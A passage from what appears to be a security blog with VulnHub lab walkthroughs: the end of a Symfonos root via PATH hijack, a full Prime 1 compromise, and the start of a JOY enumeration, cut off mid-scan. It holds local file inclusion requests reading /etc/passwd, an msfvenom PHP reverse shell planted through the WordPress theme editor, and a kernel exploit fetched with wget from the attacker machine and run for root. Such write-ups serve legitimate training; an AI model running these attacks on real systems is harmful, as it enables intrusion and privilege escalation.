Date: Sat, 29 May 2021 18:57:19 GMT 
Server: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span> 
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT 
ETag: <span class="s2">"148-58c6b9bb3bc5b"</span> 
Accept-Ranges: bytes  
Content-Length: 328        
Vary: Accept-Encoding       
Content-Type: text/html
</code></pre></div></div>
<p>Analysing the binary with the strings command, I can see that it’s executing the curl utility, so I will try to hijack the path.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>strings /opt/statuscheck
...
_ITM_registerTMCloneTable 
GLIBC_2.2.5  
curl <span class="nt">-I</span> H 
http://lH 
ocalhostH
...
</code></pre></div></div>
<p>I export my current directory to the <strong>PATH</strong> environment variable, then I redirect with echo the <strong>/bin/dash</strong> command to the curl file, assign execution permissions to it, and finally run the statuscheck binary thus obtaining root access to this machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/dash'</span> <span class="o">&gt;</span> curl 
helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x curl 
helios@symfonos:/dev/shm<span class="nv">$ </span>/opt/statuscheck 
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
<span class="c"># whoami</span>
root
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Prime 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>May 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This machine is designed for those one who is trying to prepare for OSCP.</p>

<p><strong>Author:</strong> Suraj Pandey</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/prime-1,358/">https://www.vulnhub.com/entry/prime-1,358/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>We started discovering our target with netdiscover as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts
                                                             
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.134 00:0c:29:eb:a5:7c      5     300  VMware, Inc. 
 192.168.179.254 00:50:56:fc:5b:5c      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Ones our target has been detected, it’s time to discover the possible open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-p1-65535</span> <span class="nt">-n</span> <span class="nt">-v</span> 192.168.179.134 <span class="nt">-oG</span> tcp-nmap-all-ports.txt 
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:EB:A5:7C <span class="o">(</span>VMware<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then with nmap I proceed to enumerate the versions of the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 192.168.179.134 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span> 
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 <span class="o">(</span>RSA<span class="o">)</span>
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: HacknPentest
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>The only port that looks promising is 80, so I run dirsearch to brute force and find hidden files and directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-x</span> 400,401,403,404 <span class="nt">-f</span> <span class="nt">-e</span> txt,html,php <span class="nt">-u</span> http://192.168.179.134/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...
<span class="o">[</span>11:02:15] 200 -  136B  - /index.php
<span class="o">[</span>11:02:21] 200 -  147B  - /image.php
<span class="o">[</span>11:02:38] 301 -  322B  - /wordpress  -&gt;  http://192.168.179.134/wordpress/
<span class="o">[</span>11:02:40] 200 -   11KB - /wordpress/
<span class="o">[</span>11:02:48] 200 -  131B  - /dev
<span class="o">[</span>11:02:58] 301 -  323B  - /javascript  -&gt;  http://192.168.179.134/javascript/
<span class="o">[</span>11:05:44] 200 -  412B  - /secret.txt
</code></pre></div></div>
<p>In the above output we see the secret.txt file, we request this file and we find a note giving us a clue to find the correct parameter, assigning it as value the location.txt file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/secret.txt
</code></pre></div></div>
<p><img src="/assets/images/prime1/screenshot-1.png" alt="" /></p>

<p>To find the hidden parameter I developed a python script to find it.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">signal</span><span class="p">,</span><span class="n">sys</span>
<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span><span class="n">Fore</span>

<span class="n">green</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
<span class="n">red</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RED</span>
<span class="n">reset</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>

<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">red</span><span class="si">}</span><span class="se">\r</span><span class="s">You pressed CTRL+C</span><span class="si">{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">op</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"[e]xit / [c]ontinue:"</span> <span class="p">))</span>
    <span class="k">if</span> <span class="n">op</span><span class="o">==</span><span class="s">'e'</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">req</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"http://192.168.179.134/index.php?</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">=location.txt"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/wfuzz/wordlist/general/common.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}{</span><span class="n">req</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p>I run the script and find the <strong>file</strong> parameter with a different size request, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py
...
136 <span class="o">=&gt;</span> field                  
334 <span class="o">=&gt;</span> file        
136 <span class="o">=&gt;</span> files
...
</code></pre></div></div>
<p>I verify the request with the browser and indeed the <strong>file</strong> parameter is correct, we found a note that tells us to use the <strong>secrettier360</strong> parameter on some other php page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/index.php?file<span class="o">=</span>location.txt
</code></pre></div></div>
<p><img src="/assets/images/prime1/screenshot-2.png" alt="" /></p>

<p>I request the passwd file from the system and we get the users, note that at the bottom we find a message that tells us that the <strong>password.txt</strong> file can be found in the saket home directory, as we see is possible include system files, so this prameter is vulnerable to Local File Inclusion.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/image.php?secrettier360<span class="o">=</span>/etc/passwd
</code></pre></div></div>

<p><img src="/assets/images/prime1/screenshot-3.png" alt="" /></p>

<p>Including the <strong>password.txt</strong> file from the sacket home directory, we find the password <strong>follow_the_ippsec</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.134/image.php?secrettier360<span class="o">=</span>/home/saket/password.txt
</code></pre></div></div>

<p><img src="/assets/images/prime1/screenshot-4.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="wordpress-cms">Wordpress CMS</h3>

<p>If we remember that when we enumerate with dirsearch we find the wordpress directory, browsing the home page we see the <strong>victor</strong> user, so I tried to log in to wordpress with the password <strong>follow_the_ippsec</strong>.</p>

<p><img src="/assets/images/prime1/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/prime1/screenshot-6.png" alt="" /></p>

<p>Then trying tu upload a php reverse shell in the theme editor, I find the secret.php file which is the only one with write permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Appearance -&gt; Theme Editor -&gt; secret.php
</code></pre></div></div>
<p><img src="/assets/images/prime1/screenshot-7.png" alt="" /></p>

<p>I generate a php reverse shell with msfvenom, then inject it into the secret.php file and save it hitting the <strong>Update File</strong> button.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> shell.php
</code></pre></div></div>
<p><img src="/assets/images/prime1/screenshot-8.png" alt="" /></p>

<p>Later set up a netcat listener on port 443 and request with curl the secret.php file, giving us a reverse shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.134/wordpress/wp-content/themes/twentynineteen/secret.php
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.134] 56146
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen<span class="nv">$ </span>4.10.0-28-generic
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="linux-kernel-exploit">Linux Kernel Exploit</h3>

<p>To this kernel version I found an exploit <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">cve-2017-16995</a>, that allows for arbitrary read/write access to the linux kernel, bypassing SMEP/SMAP.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit ubuntu 4.10.0-28 
<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
 Exploit Title                                                                                           |  Path   
<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
Linux Kernel 4.10.5 / &lt; 4.14.3 <span class="o">(</span>Ubuntu<span class="o">)</span> - DCCP Socket Use-After-Free                                     | linux/dos/43234.c 
Linux Kernel &lt; 4.13.9 <span class="o">(</span>Ubuntu 16.04 / Fedora 27<span class="o">)</span> - Local Privilege Escalation                            | linux/local/45010.c 
Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                   | linux/local/41760.txt 
<span class="nt">---------------------------------------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
</code></pre></div></div>

<p>So, I copied the exploit to my current directory and started a web server with python, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/45010.c
root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</code></pre></div></div>
<p>Then I downloaded the exploit on the target machine, compiled it and ran it, and this way I got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span>wget 192.168.179.1:8000/45010.c <span class="nt">-O</span> r00t.c
www-data@ubuntu:/dev/shm<span class="nv">$ </span>gcc r00t.c <span class="nt">-o</span> r00t
gcc r00t.c <span class="nt">-o</span> r00t
www-data@ubuntu:/dev/shm<span class="nv">$ </span>./r00t
./r00t
<span class="o">[</span>.] 
<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
<span class="o">[</span>.] 
<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
<span class="o">[</span>.] 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff8f28770c8500
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff8f2841f41000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 592
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8f2871321b00
<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 33, matches the current: 33
<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8f2871321b00
<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
<span class="nb">cat</span> /root/root.txt
b2b17036da1de94cfb024540a8e7075a
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - digitalworld.local JOY</h1>
	<p class="post-date text-bold text-upcase">
	<span>May 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is a vulnerable machine designed for OSCP preparation.</p>

<p><strong>Author:</strong> Donavan</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></p>

<h2 id="information-gathering">Information Gathering</h2>

<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target with arp-scan, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.133 00:0c:29:65:f3:32       VMware, Inc.
192.168.179.254 00:50:56:e4:71:ef       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Then proceed to perform a port scanning with unicornscan to discover open TCP and UDP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> 192.168.179.133:a <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> 192.168.179.133:a
...
listener statistics 131504 packets recieved 0 packets droped and 0 interface drops
TCP open                     ftp[   21]         from 192.168.179.133  ttl 64
TCP open                     ssh[   22]         from 192.168.179.133  ttl 64
TCP open                    smtp[   25]         from 192.168.179.133  ttl 64
TCP open                    http[   80]         from 192.168.179.133  ttl 64
TCP open                    pop3[  110]         from 192.168.179.133  ttl 64
TCP open             netbios-ssn[  139]         from 192.168.179.133  ttl 64
TCP open                    imap[  143]         from 192.168.179.133  ttl 64
TCP open            microsoft-ds[  445]         from 192.168.179.133  ttl 64
TCP open                     urd[  465]         from 192.168.179.133  ttl 64
TCP open              submission[  587]         from 192.168.179.133  ttl 64
TCP open                   imaps[  993]         from 192.168.179.133  ttl 64
TCP open                   pop3s[  995]         from 192.168.179.133  ttl 64

...
listener statistics 264 packets recieved 0 packets droped and 0 interface drops
UDP open              netbios-ns[  137]         from 192.168.179.133  ttl 64 
UDP open                    snmp[  161]         from 192.168.179.133  ttl 64
.....
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>After, I perform a TCP scan more complete with nmap to discover the services banner and possible open ports misconfigurations.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p21</span>,22,25,80,110,139,143,445,465,587,993,995 <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 <span class="o">(</span>protocol 2.0<span class="o">)</span>
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>80/tcp  open  http        Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Index of /
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL UIDL STLS CAPA PIPELINING AUTH-RESP-CODE TOP
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login LOGIN-REFERRALS have more IDLE listed SASL-IR STARTTLS OK LITERAL+ capabilities LOGINDISABLEDA0001 ID Pre-login IMAP4rev1 ENABLE
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY
| Subject Alternative Name: DNS:JOY
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
|_SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY
| Subject Alternative Name: DNS:JOY
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
|_SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
993/tcp open  ssl/imaps?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
|_SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>995/tcp open  ssl/pop3s?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
|_SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
...
</code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<p>We focus on port 21, since the anonymous login is anabled, so we will create a mount of the FTP service to our attacking machine, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/ftp
root@kali:~<span class="nv">$ </span>curlftpfs ftp://anonymous:@192.168.179.133 /mnt/ftp 
</code></pre></div></div>
<p>Enumerating the upload directory I find the <strong>directory</strong> file, the same one that contains patrick’s home directory resources, a text note and the result of the uname command, the content of this file is updated every period of time, so it is possible that a cron job is behind all this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat</span> /mnt/ftp/upload/directory         
Patrick<span class="s1">'s Directory                                   
                                                    
total 356
-rw-------  1 patrick patrick   185 Jan 28  2019 .bash_history  
-rw-r--r--  1 patrick patrick   220 Dec 23  2018 .bash_logout    
-rw-r--r--  1 patrick patrick  3526 Dec 23  2018 .bashrc         
...
-rw-r--r--  1 patrick patrick   407 Jan 27  2019 version_control
...
</span></code></pre></div></div>
<p>In the output we can see the <strong>version_control</strong> file, this looks interesting, but not finding a way to exploit it, I proceed to enumerate other services.</p>

<h3 id="samba-enumeration">Samba Enumeration</h3>
<p>Enumerating the samba service, I found the local users patrick and ftp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/ftp/upload<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.133
...
<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
S-1-22-1-1000 Unix User<span class="se">\p</span>atrick <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1001 Unix User<span class="se">\f</span>tp <span class="o">(</span>Local User<span class="o">)</span> 
</code></pre></div></div>

<h3 id="snmp-enumeration">SNMP Enumeration</h3>
<p>After spend some time trying to enumerate other services, I focused on research the UDP SNMP service and found that the <strong>TFTPd</strong> service is running on port 36969 under patrick’s home directory, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sU</span> <span class="nt">-v</span> <span class="nt">-p161</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.179.133
...
|   752: 
|     Name: <span class="k">in</span>.tftpd 
|     Path: /usr/sbin/in.tftpd
